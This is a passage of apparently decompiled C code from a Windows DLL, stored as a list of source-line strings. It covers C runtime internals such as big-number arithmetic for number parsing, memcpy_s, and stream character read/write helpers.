    "              v202 = (unsigned int)v195 + (unsigned __int64)(unsigned int)v294[v201];",
    "              v294[v201] = v202;",
    "              v191 = v293;",
    "              LODWORD(v195) = HIDWORD(v202);",
    "              if ( !HIDWORD(v202) )",
    "                goto LABEL_334;",
    "            }",
    "LABEL_351:",
    "            v291 = 0;",
    "            memcpy_s(v292, 0x1CCu, v286, 0);",
    "            v166 = v291;",
    "            v170 = v265;",
    "            v177 = 0;",
    "            v262 = v291;",
    "LABEL_341:",
    "            if ( !v177 )",
    "              goto LABEL_360;",
    "            v170 -= v275;",
    "            v265 = v170;",
    "            if ( !v170 )",
    "            {",
    "              v169 = v268;",
    "              v167 = v273;",
    "              break;",
    "            }",
    "            goto LABEL_287;",
    "          }",
    "        }",
    "LABEL_334:",
    "        if ( v196 == 115 )",
    "          goto LABEL_351;",
    "        v188 = v281;",
    "      }",
    "      else if ( (_DWORD)v192 == v191 )",
    "      {",
    "        v294[v192] = 0;",
    "        v191 = v192 + 1;",
    "        v293 = v192 + 1;",
    "      }",
    "      v192 = (unsigned int)(v192 + 1);",
    "      if ( (_DWORD)v192 == v189 )",
    "      {",
    "        v291 = v191;",
    "        memcpy_s(v292, 0x1CCu, v294, 4LL * v191);",
    "        v170 = v265;",
    "        goto LABEL_338;",
    "      }",
    "    }",
    "  }",
    "  v203 = v167 - 10 * v169;",
    "  if ( !v203 )",
    "    goto LABEL_349;",
    "  v204 = dword_18003C958[v203 - 1];",
    "  if ( !v204 )",
    "  {",
    "    v291 = 0;",
    "    memcpy_s(v292, 0x1CCu, v286, 0);",
    "    goto LABEL_347;",
    "  }",
    "  if ( v204 == 1 || !v166 )",
    "    goto LABEL_349;",
    "  LODWORD(v206) = 0;",
    "  v207 = 0;",
    "  v208 = (unsigned int)dword_18003C958[v203 - 1];",
    "  do",
    "  {",
    "    v209 = v207++;",
    "    v210 = (unsigned int)v206 + v208 * v292[v209];",
    "    v292[v209] = v210;",
    "    v206 = HIDWORD(v210);",
    "  }",
    "  while ( v207 != v166 );",
    "  if ( !HIDWORD(v210) )",
    "  {",
    "LABEL_347:",
    "    v166 = v291;",
    "    goto LABEL_348;",
    "  }",
    "  if ( v291 >= 0x73 )",
    "  {",
    "LABEL_360:",
    "    v291 = 0;",
    "    memcpy_s(v292, 0x1CCu, v286, 0);",
    "    v211 = *(_BYTE *)(a1 + 776);",
    "    if ( a2[8] )",
    "      *(_QWORD *)sub_18001B710(a2) = -(__int64)(v211 != 0) & 0x8000000000000000uLL;",
    "    else",
    "      *(_DWORD *)sub_18001B74C(a2) = v211 != 0 ? 0x80000000 : 0;",
    "    return 2;",
    "  }",
    "  else",
    "  {",
    "    v292[v291] = HIDWORD(v210);",
    "    v166 = ++v291;",
    "LABEL_348:",
    "    v262 = v166;",
    "LABEL_349:",
    "    if ( v110 )",
    "    {",
    "      v212 = v110 - 1;",
    "      v108 = !_BitScanReverse((unsigned int *)&v213, Destination[v212]);",
    "      if ( v108 )",
    "        v214 = 0;",
    "      else",
    "        v214 = v213 + 1;",
    "      v205 = v214 + 32 * v212;",
    "    }",
    "    else",
    "    {",
    "      v205 = 0;",
    "    }",
    "    if ( v166 )",
    "    {",
    "      v216 = v166 - 1;",
    "      v108 = !_BitScanReverse((unsigned int *)&v217, v292[v216]);",
    "      if ( v108 )",
    "        v218 = 0;",
    "      else",
    "        v218 = v217 + 1;",
    "      v215 = v218 + 32 * v216;",
    "    }",
    "    else",
    "    {",
    "      v215 = 0;",
    "    }",
    "    v219 = v205 < v215 ? v215 - v205 : 0;",
    "    if ( v219 )",
    "    {",
    "      v220 = v219 & 0x1F;",
    "      v221 = v219 >> 5;",
    "      v108 = !_BitScanReverse((unsigned int *)&v222, Destination[v110 - 1]);",
    "      if ( v108 )",
    "        v223 = 0;",
    "      else",
    "        v223 = v222 + 1;",
    "      if ( v221 + v110 > 0x73 || (v224 = v110 + v221 + (v220 > 32 - v223), v224 > 0x73) )",
    "      {",
    "        v287 = 0;",
    "        memcpy_s(Destination, 0x1CCu, v286, 0);",
    "        v110 = v287;",
    "      }",
    "      else",
    "      {",
    "        v225 = v224 - 1;",
    "        if ( (_DWORD)v225 != v221 - 1 )",
    "        {",
    "          while ( 1 )",
    "          {",
    "            v226 = (unsigned int)v225 - v221;",
    "            v227 = (unsigned int)(v226 - 1);",
    "            v228 = (unsigned int)v226 >= v110 ? 0 : Destination[v226];",
    "            v229 = (unsigned int)v227 >= v110 ? 0 : Destination[v227];",
    "            Destination[v225] = ((((unsigned int)(1LL << (32 - (unsigned __int8)v220)) - 1) & v228) << v220)",
    "                              | ((~((unsigned int)(1LL << (32 - (unsigned __int8)v220)) - 1) & v229) >> (32 - v220));",
    "            v225 = (unsigned int)(v225 - 1);",
    "            if ( (_DWORD)v225 == v221 - 1 )",
    "              break;",
    "            v110 = v287;",
    "          }",
    "          v166 = v262;",
    "        }",
    "        v230 = 0;",
    "        if ( v221 )",
    "        {",
    "          do",
    "          {",
    "            v231 = v230++;",
    "            Destination[v231] = 0;",
    "          }",
    "          while ( v230 != v221 );",
    "        }",
    "        v110 = v224;",
    "        v287 = v224;",
    "      }",
    "    }",
    "    v232 = v271;",
    "    v233 = v276 - v271;",
    "    v277 = v233;",
    "    v234 = v233;",
    "    if ( v271 )",
    "    {",
    "      if ( v219 > v233 )",
    "        return sub_18001BB34(&v289, v271, *(_BYTE *)(a1 + 776), 1, (__int64)a2);",
    "      v234 = v233 - v219;",
    "    }",
    "    if ( v110 <= v166 )",
    "    {",
    "      if ( v110 < v166 )",
    "      {",
    "        v235 = 1;",
    "        goto LABEL_406;",
    "      }",
    "      for ( i = v110 - 1; (_DWORD)i != -1; i = (unsigned int)(i - 1) )",
    "      {",
    "        v237 = v292[i];",
    "        if ( Destination[i] != v237 )",
    "        {",
    "          v235 = Destination[i] <= v237;",
    "          goto LABEL_406;",
    "        }",
    "      }",
    "    }",
    "    v235 = 0;",
    "LABEL_406:",
    "    v238 = v234;",
    "    if ( v235 )",
    "      ++v219;",
    "    v239 = v234 & 0x1F;",
    "    v240 = v238 >> 5;",
    "    v108 = !_BitScanReverse((unsigned int *)&v241, Destination[v110 - 1]);",
    "    if ( v108 )",
    "      v242 = 0;",
    "    else",
    "      v242 = v241 + 1;",
    "    if ( v240 + v110 > 0x73 || (v243 = v110 + v240 + (v239 > 32 - v242), v243 > 0x73) )",
    "    {",
    "      v287 = 0;",
    "      memcpy_s(Destination, 0x1CCu, v286, 0);",
    "    }",
    "    else",
    "    {",
    "      v244 = v243 - 1;",
    "      if ( (_DWORD)v244 != v240 - 1 )",
    "      {",
    "        while ( 1 )",
    "        {",
    "          v245 = (unsigned int)v244 - v240;",
    "          v246 = (unsigned int)(v245 - 1);",
    "          v247 = (unsigned int)v245 >= v110 ? 0 : Destination[v245];",
    "          v248 = (unsigned int)v246 >= v110 ? 0 : Destination[v246];",
    "          Destination[v244] = ((((unsigned int)(1LL << (32 - (unsigned __int8)v239)) - 1) & v247) << v239)",
    "                            | ((~((unsigned int)(1LL << (32 - (unsigned __int8)v239)) - 1) & v248) >> (32 - v239));",
    "          v244 = (unsigned int)(v244 - 1);",
    "          if ( (_DWORD)v244 == v240 - 1 )",
    "            break;",
    "          v110 = v287;",
    "        }",
    "        v232 = v271;",
    "      }",
    "      v249 = 0;",
    "      if ( v240 )",
    "      {",
    "        do",
    "        {",
    "          Destination[v249] = 0;",
    "          v249 = (unsigned int)(v249 + 1);",
    "        }",
    "        while ( (_DWORD)v249 != v240 );",
    "      }",
    "      v287 = v243;",
    "    }",
    "    v250 = sub_18001DBC0(&v287, &v291);",
    "    v251 = v287 == 0;",
    "    if ( v250 <= 0xFFFFFFFF )",
    "    {",
    "      v108 = !_BitScanReverse((unsigned int *)&v255, v250);",
    "      if ( v108 )",
    "        v254 = 0;",
    "      else",
    "        v254 = v255 + 1;",
    "    }",
    "    else",
    "    {",
    "      v108 = !_BitScanReverse((unsigned int *)&v252, HIDWORD(v250));",
    "      if ( v108 )",
    "        v253 = 0;",
    "      else",
    "        v253 = v252 + 1;",
    "      v254 = v253 + 32;",
    "    }",
    "    if ( v254 > v277 )",
    "    {",
    "      v256 = v254 - v277;",
    "      v251 = !v287 && (((1LL << v256) - 1) & v250) == 0;",
    "      v250 >>= v256;",
    "    }",
    "    v257 = 0;",
    "    v258 = ~v219;",
    "    if ( v5 )",
    "      v257 = v290[0];",
    "    v259 = 0;",
    "    if ( v5 > 1 )",
    "      v259 = v290[1];",
    "    if ( v232 )",
    "      v258 = v232 - 2;",
    "    return sub_18001B788(",
    "             v250 + ((v257 + ((unsigned __int64)v259 << 32)) << v277),",
    "             v258,",
    "             *(_BYTE *)(a1 + 776),",
    "             v251,",
    "             (__int64)a2);",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001DB14(__int64 a1, __int64 a2)",
    "{",
    "  unsigned __int64 v3; // rcx",
    "  unsigned __int8 *v5; // r8",
    "  __int64 v6; // r11",
    "  int v7; // r10d",
    "  unsigned __int64 v8; // rdx",
    "  __int64 v9; // rax",
    "  char i; // r9",
    "  char v11; // al",
    "",
    "  v3 = 0;",
    "  v5 = (unsigned __int8 *)(a1 + 8);",
    "  v6 = *(unsigned int *)(a1 + 4) + a1 + 8;",
    "  v7 = *(_DWORD *)a1 + (*(_BYTE *)(a2 + 8) != 0 ? 52 : 23);",
    "  if ( a1 + 8 != v6 )",
    "  {",
    "    v8 = (-(__int64)(*(_BYTE *)(a2 + 8) != 0) & 0x1FFFFFFF000000LL) + 0xFFFFFF;",
    "    do",
    "    {",
    "      if ( v3 > v8 )",
    "        break;",
    "      v9 = *v5;",
    "      v7 -= 4;",
    "      ++v5;",
    "      v3 = v9 + 16 * v3;",
    "    }",
    "    while ( v5 != (unsigned __int8 *)v6 );",
    "  }",
    "  for ( i = 1; v5 != (unsigned __int8 *)v6 && i; i = v11 == 0 )",
    "    v11 = *v5++;",
    "  return sub_18001B788(v3, v7, *(_BYTE *)(a1 + 776), i, a2);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001DBC0(char *a1, unsigned int *a2)",
    "{",
    "  unsigned int v4; // edi",
    "  __int64 v5; // r10",
    "  __int64 v6; // rbp",
    "  unsigned __int64 v7; // r12",
    "  int v8; // ebp",
    "  unsigned int v9; // ebx",
    "  __int64 result; // rax",
    "  unsigned int v11; // edi",
    "  __int64 v12; // r14",
    "  unsigned __int64 v13; // rdi",
    "  __int64 v14; // r8",
    "  unsigned __int64 v15; // r8",
    "  __int64 v16; // rdx",
    "  int v17; // r8d",
    "  int v18; // r9d",
    "  signed __int64 v19; // r11",
    "  char *v20; // rcx",
    "  unsigned int v21; // r9d",
    "  unsigned int v22; // r11d",
    "  bool v23; // zf",
    "  int v24; // eax",
    "  int v25; // ebx",
    "  char v26; // r14",
    "  unsigned int v27; // eax",
    "  unsigned int v28; // r9d",
    "  unsigned int v29; // r11d",
    "  int v30; // r12d",
    "  __int64 v31; // r11",
    "  __int64 v32; // r13",
    "  unsigned int v33; // edx",
    "  __int64 v34; // r11",
    "  unsigned __int64 v35; // r8",
    "  unsigned __int64 v36; // r9",
    "  unsigned __int64 v37; // r8",
    "  unsigned __int64 v38; // rax",
    "  unsigned __int64 v39; // rax",
    "  unsigned __int64 v40; // r10",
    "  unsigned int v41; // r11d",
    "  unsigned int *v42; // r14",
    "  __int64 v43; // rax",
    "  unsigned __int64 v44; // r10",
    "  unsigned int v45; // r8d",
    "  __int64 v46; // rcx",
    "  unsigned int v47; // eax",
    "  unsigned __int64 v48; // rdx",
    "  unsigned int *v49; // r11",
    "  unsigned int v50; // r10d",
    "  unsigned __int64 v51; // r8",
    "  __int64 v52; // rax",
    "  __int64 v53; // rcx",
    "  char *v54; // rdx",
    "  __int64 v55; // rax",
    "  unsigned __int64 v56; // r8",
    "  unsigned int v57; // r10d",
    "  unsigned int i; // ecx",
    "  __int64 v59; // rax",
    "  unsigned __int64 v60; // [rsp+20h] [rbp-238h]",
    "  unsigned __int64 v61; // [rsp+28h] [rbp-230h]",
    "  __int64 v62; // [rsp+30h] [rbp-228h]",
    "  char v63; // [rsp+38h] [rbp-220h]",
    "  _BYTE Source[468]; // [rsp+44h] [rbp-214h] BYREF",
    "  char v65; // [rsp+260h] [rbp+8h]",
    "  unsigned int v67; // [rsp+270h] [rbp+18h]",
    "  unsigned int v68; // [rsp+278h] [rbp+20h]",
    "",
    "  if ( !*(_DWORD *)a1 )",
    "    return 0;",
    "  v4 = *a2;",
    "  if ( !*a2 )",
    "    return 0;",
    "  v5 = (unsigned int)(*(_DWORD *)a1 - 1);",
    "  v6 = v4 - 1;",
    "  if ( v4 == 1 )",
    "  {",
    "    v7 = a2[1];",
    "    v8 = 0;",
    "    if ( (_DWORD)v7 == 1 )",
    "    {",
    "      v9 = *((_DWORD *)a1 + 1);",
    "      *(_DWORD *)a1 = 0;",
    "      memcpy_s(a1 + 4, 0x1CCu, Source, 0);",
    "      return v9;",
    "    }",
    "    else if ( *(_DWORD *)a1 == 1 )",
    "    {",
    "      v11 = *((_DWORD *)a1 + 1);",
    "      *(_DWORD *)a1 = 0;",
    "      memcpy_s(a1 + 4, 0x1CCu, Source, 0);",
    "      *((_DWORD *)a1 + 1) = v11 % (unsigned int)v7;",
    "      LOBYTE(v8) = v11 % (unsigned int)v7 != 0;",
    "      result = v11 / (unsigned int)v7;",
    "      *(_DWORD *)a1 = v8;",
    "    }",
    "    else",
    "    {",
    "      v12 = 0;",
    "      v13 = 0;",
    "      if ( *(_DWORD *)a1 )",
    "      {",
    "        do",
    "        {",
    "          v14 = *(unsigned int *)&a1[4 * v5 + 4];",
    "          v5 = (unsigned int)(v5 - 1);",
    "          v15 = (v13 << 32) | v14;",
    "          v12 = (unsigned int)(v15 / v7) + (v12 << 32);",
    "          v13 = v15 % v7;",
    "        }",
    "        while ( (_DWORD)v5 != -1 );",
    "      }",
    "      *(_DWORD *)a1 = 0;",
    "      memcpy_s(a1 + 4, 0x1CCu, Source, 0);",
    "      *(_QWORD *)(a1 + 4) = v13;",
    "      result = v12;",
    "      LOBYTE(v8) = HIDWORD(v13) != 0;",
    "      *(_DWORD *)a1 = v8 + 1;",
    "    }",
    "    return result;",
    "  }",
    "  if ( (unsigned int)v6 > (unsigned int)v5 )",
    "    return 0;",
    "  v16 = (int)v5;",
    "  v17 = v5 - v6;",
    "  v18 = *(_DWORD *)a1 - 1;",
    "  if ( (int)v5 < (__int64)((int)v5 - (int)v6) )",
    "    goto LABEL_18;",
    "  v19 = (char *)&a2[-v17] - a1;",
    "  v20 = &a1[4 * (int)v5 + 4];",
    "  while ( *(_DWORD *)&v20[v19] == *(_DWORD *)v20 )",
    "  {",
    "    --v18;",
    "    --v16;",
    "    v20 -= 4;",
    "    if ( v16 < v17 )",
    "      goto LABEL_18;",
    "  }",
    "  if ( a2[v18 - v17 + 1] < *(_DWORD *)&a1[4 * v18 + 4] )",
    "LABEL_18:",
    "    ++v17;",
    "  if ( !v17 )",
    "    return 0;",
    "  v21 = a2[v6 + 1];",
    "  v22 = a2[v4 - 1];",
    "  v23 = !_BitScanReverse((unsigned int *)&v24, v21);",
    "  v67 = v22;",
    "  if ( v23 )",
    "  {",
    "    v25 = 32;",
    "    v65 = 0;",
    "    v26 = 0;",
    "    goto LABEL_24;",
    "  }",
    "  v25 = 31 - v24;",
    "  v26 = 32 - (31 - v24);",
    "  v65 = v26;",
    "  if ( v24 != 31 )",
    "  {",
    "LABEL_24:",
    "    v27 = v21 << v25;",
    "    v28 = v22 >> v26;",
    "    v29 = v22 << v25;",
    "    v21 = v27 | v28;",
    "    v67 = v29;",
    "    if ( v4 > 2 )",
    "      v67 = (a2[v4 - 2] >> v26) | v29;",
    "  }",
    "  v30 = v17 - 1;",
    "  v62 = 0;",
    "  v31 = 0;",
    "  if ( v17 - 1 >= 0 )",
    "  {",
    "    v63 = v26;",
    "    v32 = v30 + v4;",
    "    v61 = v21;",
    "    do",
    "    {",
    "      if ( (unsigned int)v32 > (unsigned int)v5 )",
    "        v33 = 0;",
    "      else",
    "        v33 = *(_DWORD *)&a1[4 * v32 + 4];",
    "      v68 = v33;",
    "      v34 = *(unsigned int *)&a1[4 * (unsigned int)(v32 - 2) + 4];",
    "      LODWORD(v60) = *(_DWORD *)&a1[4 * (unsigned int)(v32 - 1) + 4];",
    "      HIDWORD(v60) = v33;",
    "      if ( v25 )",
    "      {",
    "        v35 = (v60 << v25) | ((unsigned __int64)(unsigned int)v34 >> v63);",
    "        v34 = (unsigned int)((_DWORD)v34 << v25);",
    "        if ( (unsigned int)v32 >= 3 )",
    "          v34 = (*(_DWORD *)&a1[4 * (unsigned int)(v32 - 3) + 4] >> v26) | (unsigned int)v34;",
    "      }",
    "      else",
    "      {",
    "        v35 = v60;",
    "      }",
    "      v36 = v35 / v61;",
    "      v37 = (unsigned int)(v35 % v61);",
    "      if ( v36 > 0xFFFFFFFF )",
    "      {",
    "        v38 = v36 - 0xFFFFFFFF;",
    "        v36 = 0xFFFFFFFFLL;",
    "        v37 += v61 * v38;",
    "      }",
    "      if ( v37 <= 0xFFFFFFFF )",
    "      {",
    "        v39 = v36 * v67;",
    "        do",
    "        {",
    "          if ( v39 <= (v34 | (v37 << 32)) )",
    "            break;",
    "          --v36;",
    "          v39 -= v67;",
    "          v37 += v61;",
    "        }",
    "        while ( v37 <= 0xFFFFFFFF );",
    "        v26 = v65;",
    "      }",
    "      if ( v36 )",
    "      {",
    "        v40 = 0;",
    "        v41 = 0;",
    "        if ( v4 )",
    "        {",
    "          v42 = a2 + 1;",
    "          do",
    "          {",
    "            v43 = *v42++;",
    "            v44 = v36 * v43 + v40;",
    "            v45 = v44;",
    "            v46 = v41 + v30;",
    "            v47 = *(_DWORD *)&a1[4 * v46 + 4];",
    "            v48 = HIDWORD(v44);",
    "            v40 = HIDWORD(v44) + 1;",
    "            if ( v47 >= v45 )",
    "              v40 = v48;",
    "            ++v41;",
    "            *(_DWORD *)&a1[4 * v46 + 4] = v47 - v45;",
    "          }",
    "          while ( v41 < v4 );",
    "          v26 = v65;",
    "        }",
    "        v49 = a2 + 1;",
    "        if ( v68 < v40 )",
    "        {",
    "          v50 = 0;",
    "          if ( v4 )",
    "          {",
    "            v51 = 0;",
    "            do",
    "            {",
    "              v52 = v50 + v30;",
    "              ++v50;",
    "              v53 = *(unsigned int *)&a1[4 * v52 + 4];",
    "              v54 = &a1[4 * v52];",
    "              v55 = *v49++;",
    "              v56 = v53 + v55 + v51;",
    "              *((_DWORD *)v54 + 1) = v56;",
    "              v51 = HIDWORD(v56);",
    "            }",
    "            while ( v50 < v4 );",
    "          }",
    "          LODWORD(v36) = v36 - 1;",
    "        }",
    "        LODWORD(v5) = v32 - 1;",
    "      }",
    "      v32 = (unsigned int)(v32 - 1);",
    "      v31 = (unsigned int)v36 + (v62 << 32);",
    "      --v30;",
    "      v62 = v31;",
    "    }",
    "    while ( v30 >= 0 );",
    "  }",
    "  v57 = v5 + 1;",
    "  for ( i = v57; i < *(_DWORD *)a1; *(_DWORD *)&a1[4 * v59 + 4] = 0 )",
    "    v59 = i++;",
    "  for ( *(_DWORD *)a1 = v57; v57; *(_DWORD *)a1 = v57 )",
    "  {",
    "    if ( *(_DWORD *)&a1[4 * --v57 + 4] )",
    "      break;",
    "  }",
    "  return v31;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001E05C(__int64 a1, __int64 a2, __int64 *a3)",
    "{",
    "  __int64 v3; // rdi",
    "  unsigned int v4; // ebx",
    "  __int16 v5; // si",
    "  unsigned int v6; // ebp",
    "  __int64 v7; // rax",
    "  __int64 v9; // rax",
    "",
    "  v3 = (int)a1;",
    "  v4 = 0;",
    "  v5 = a2;",
    "  v6 = a1 + 1;",
    "  if ( a3 )",
    "  {",
    "    v9 = *a3;",
    "    if ( v6 > 0x100 )",
    "    {",
    "      if ( *(int *)(v9 + 8) <= 1 )",
    "        return 0;",
    "      else",
    "        return sub_180027F48((unsigned int)a1);",
    "    }",
    "    else",
    "    {",
    "      return a2 & *(_WORD *)(*(_QWORD *)v9 + 2LL * (int)a1);",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v7 = sub_180020DB4(a1, a2);",
    "    if ( v6 <= 0x100 )",
    "      return (unsigned __int16)(v5 & *(_WORD *)(v7 + 2 * v3));",
    "    return v4;",
    "  }",
    "}",
    "",
    "",
    "errno_t __cdecl memcpy_s(",
    "        void *const Destination,",
    "        const rsize_t DestinationSize,",
    "        const void *const Source,",
    "        const rsize_t SourceSize)",
    "{",
    "  _DWORD *v8; // rax",
    "  errno_t v9; // ebx",
    "",
    "  if ( !SourceSize )",
    "    return 0;",
    "  if ( !Destination )",
    "    goto LABEL_4;",
    "  if ( Source && DestinationSize >= SourceSize )",
    "  {",
    "    sub_180036160(Destination, Source, SourceSize);",
    "    return 0;",
    "  }",
    "  sub_1800368A0(Destination, 0, DestinationSize);",
    "  if ( !Source )",
    "  {",
    "LABEL_4:",
    "    v8 = sub_18001A80C();",
    "    v9 = 22;",
    "LABEL_5:",
    "    *v8 = v9;",
    "    invalid_parameter_noinfo();",
    "    return v9;",
    "  }",
    "  if ( DestinationSize < SourceSize )",
    "  {",
    "    v8 = sub_18001A80C();",
    "    v9 = 34;",
    "    goto LABEL_5;",
    "  }",
    "  return 22;",
    "}",
    "",
    "",
    "void __fastcall sub_18001E15C(__int64 a1, _QWORD *a2)",
    "{",
    "  sub_18001A8D4(a1, a2, 0);",
    "}",
    "",
    "",
    "void __fastcall sub_18001E164(__int64 a1, _QWORD *a2)",
    "{",
    "  sub_18001A82C(a1, a2, 0);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001E16C(unsigned __int8 **a1)",
    "{",
    "  unsigned __int8 *v4; // rax",
    "  unsigned int v5; // ecx",
    "",
    "  if ( a1 )",
    "  {",
    "    if ( --*((_DWORD *)a1 + 4) < 0 )",
    "    {",
    "      return sub_180028064(a1, a1);",
    "    }",
    "    else",
    "    {",
    "      v4 = *a1;",
    "      v5 = **a1;",
    "      *a1 = v4 + 1;",
    "      return v5;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001E1B0(__int64 a1)",
    "{",
    "  int v3; // edi",
    "  int v4; // eax",
    "  _BYTE *v5; // r9",
    "  _BYTE *v6; // rcx",
    "  unsigned int v7; // edi",
    "  __int64 v8; // [rsp+0h] [rbp-38h] BYREF",
    "  __int64 *v9; // [rsp+20h] [rbp-18h]",
    "",
    "  v9 = &v8;",
    "  if ( a1 )",
    "  {",
    "    sub_180017470(a1);",
    "    v3 = 1;",
    "    if ( (*(_DWORD *)(a1 + 20) & 0x1000) == 0 )",
    "    {",
    "      v4 = sub_180025DAC(a1);",
    "      if ( (unsigned int)(v4 + 2) <= 1 )",
    "      {",
    "        v6 = &unk_18004B2E0;",
    "        v5 = &unk_18004B2E0;",
    "      }",
    "      else",
    "      {",
    "        v5 = (_BYTE *)(qword_18004D870[(__int64)v4 >> 6] + 72LL * (v4 & 0x3F));",
    "        v6 = &unk_18004B2E0;",
    "      }",
    "      if ( v5[57] )",
    "        goto LABEL_11;",
    "      if ( (unsigned int)(v4 + 2) > 1 )",
    "        v6 = (_BYTE *)(qword_18004D870[(__int64)v4 >> 6] + 72LL * (v4 & 0x3F));",
    "      if ( (v6[61] & 1) != 0 )",
    "LABEL_11:",
    "        v3 = 0;",
    "    }",
    "    if ( v3 )",
    "    {",
    "      v7 = sub_18001E16C((unsigned __int8 **)a1);",
    "      sub_18001747C(a1);",
    "      return v7;",
    "    }",
    "    else",
    "    {",
    "      *(_DWORD *)sub_18001A80C() = 22;",
    "      invalid_parameter_noinfo();",
    "      sub_180035EC4(v9, &loc_18001E2A3);",
    "      return 0xFFFFFFFFLL;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)sub_18001A80C() = 22;",
    "    invalid_parameter_noinfo();",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001E2C4(unsigned int a1, __int64 a2, __int64 a3)",
    "{",
    "  int v7; // eax",
    "  _BYTE *v8; // r9",
    "  _BYTE *v9; // rcx",
    "  int v10; // eax",
    "  unsigned int v12; // edi",
    "  __int64 v13; // [rsp+0h] [rbp-48h] BYREF",
    "  __int64 *v14; // [rsp+30h] [rbp-18h]",
    "",
    "  v14 = &v13;",
    "  if ( a2 )",
    "  {",
    "    sub_180017470(a2);",
    "    if ( (*(_DWORD *)(a2 + 20) & 0x1000) != 0 )",
    "      goto LABEL_12;",
    "    v7 = sub_180025DAC(a2);",
    "    if ( (unsigned int)(v7 + 2) <= 1 )",
    "    {",
    "      v9 = &unk_18004B2E0;",
    "      v8 = &unk_18004B2E0;",
    "    }",
    "    else",
    "    {",
    "      v8 = (_BYTE *)(qword_18004D870[(__int64)v7 >> 6] + 72LL * (v7 & 0x3F));",
    "      v9 = &unk_18004B2E0;",
    "    }",
    "    if ( v8[57] )",
    "      goto LABEL_11;",
    "    if ( (unsigned int)(v7 + 2) > 1 )",
    "      v9 = (_BYTE *)(qword_18004D870[(__int64)v7 >> 6] + 72LL * (v7 & 0x3F));",
    "    if ( (v9[61] & 1) != 0 )",
    "LABEL_11:",
    "      v10 = 0;",
    "    else",
    "LABEL_12:",
    "      v10 = 1;",
    "    if ( v10 )",
    "    {",
    "      if ( --*(_DWORD *)(a2 + 16) < 0 )",
    "      {",
    "        v12 = sub_180028340(a1, a2, a3);",
    "      }",
    "      else",
    "      {",
    "        *(_BYTE *)(*(_QWORD *)a2)++ = a1;",
    "        v12 = (unsigned __int8)a1;",
    "      }",
    "      sub_18001747C(a2);",
    "      return v12;",
    "    }",
    "    else",
    "    {",
    "      *(_BYTE *)(a3 + 48) = 1;",
    "      *(_DWORD *)(a3 + 44) = 22;",
    "      sub_18001A598(0, 0, 0, 0, 0, a3);",
    "      sub_180035EC4(v14, &loc_18001E3EE);",
    "      return 0xFFFFFFFFLL;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    *(_BYTE *)(a3 + 48) = 1;",
    "    *(_DWORD *)(a3 + 44) = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, a3);",
    "    return 0xFFFFFFFFLL;",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001E42C(__int64 a1, __int64 a2, __int64 a3)",
    "{",
    "  if ( --*(_DWORD *)(a2 + 16) < 0 )",
    "    return sub_180028340(a1, a2, a3);",
    "  *(_BYTE *)(*(_QWORD *)a2)++ = a1;",
    "  return (unsigned __int8)a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001E444(unsigned int a1, __int64 a2)",
    "{",
    "  unsigned int v2; // edi",
    "  int v3; // ebx",
    "  int v4; // ebx",
    "  _QWORD v6[2]; // [rsp+20h] [rbp-40h] BYREF",
    "  char v7; // [rsp+30h] [rbp-30h]",
    "  __int128 v8; // [rsp+38h] [rbp-28h]",
    "  char v9; // [rsp+48h] [rbp-18h]",
    "  int v10; // [rsp+4Ch] [rbp-14h]",
    "  char v11; // [rsp+50h] [rbp-10h]",
    "  int v12; // [rsp+54h] [rbp-Ch]",
    "  char v13; // [rsp+58h] [rbp-8h]",
    "",
    "  v6[0] = 0;",
    "  v7 = 0;",
    "  v9 = 0;",
    "  v11 = 0;",
    "  v13 = 0;",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v9 = 1;",
    "    v8 = *(_OWORD *)&off_18004B498;",
    "  }",
    "  v2 = sub_18001E2C4(a1, a2, (__int64)v6);",
    "  if ( v9 == 2 )",
    "    *(_DWORD *)(v6[0] + 936LL) &= ~2u;",
    "  if ( v11 )",
    "  {",
    "    v3 = v10;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v6) + 32) = v3;",
    "  }",
    "  if ( v13 )",
    "  {",
    "    v4 = v12;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v6) + 36) = v4;",
    "  }",
    "  return v2;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001E4DC(int a1, __int64 *a2)",
    "{",
    "  int v4; // eax",
    "  _BYTE *v5; // r9",
    "  _BYTE *v6; // r10",
    "  int v8; // ecx",
    "  __int64 v9; // rdx",
    "  int v10; // eax",
    "  _BYTE *v11; // rcx",
    "",
    "  if ( (*((_DWORD *)a2 + 5) & 0x1000) == 0 )",
    "  {",
    "    v4 = sub_180025DAC(a2);",
    "    v5 = &unk_18004B2E0;",
    "    v6 = (unsigned int)(v4 + 2) <= 1",
    "       ? &unk_18004B2E0",
    "       : (_BYTE *)(qword_18004D870[(__int64)v4 >> 6] + 72LL * (v4 & 0x3F));",
    "    if ( v6[57] )",
    "      goto LABEL_9;",
    "    if ( (unsigned int)(v4 + 2) > 1 )",
    "      v5 = (_BYTE *)(qword_18004D870[(__int64)v4 >> 6] + 72LL * (v4 & 0x3F));",
    "    if ( (v5[61] & 1) != 0 )",
    "    {",
    "LABEL_9:",
    "      *(_DWORD *)sub_18001A80C() = 22;",
    "      invalid_parameter_noinfo();",
    "      return 0xFFFFFFFFLL;",
    "    }",
    "  }",
    "  if ( a1 == -1 )",
    "    return 0xFFFFFFFFLL;",
    "  v8 = *((_DWORD *)a2 + 5);",
    "  if ( (v8 & 1) == 0 && (v8 & 6) != 6 )",
    "    return 0xFFFFFFFFLL;",
    "  if ( !a2[1] )",
    "    sub_18002840C(a2);",
    "  if ( *a2 == a2[1] )",
    "  {",
    "    if ( *((_DWORD *)a2 + 4) )",
    "      return 0xFFFFFFFFLL;",
    "    ++*a2;",
    "  }",
    "  v9 = *a2;",
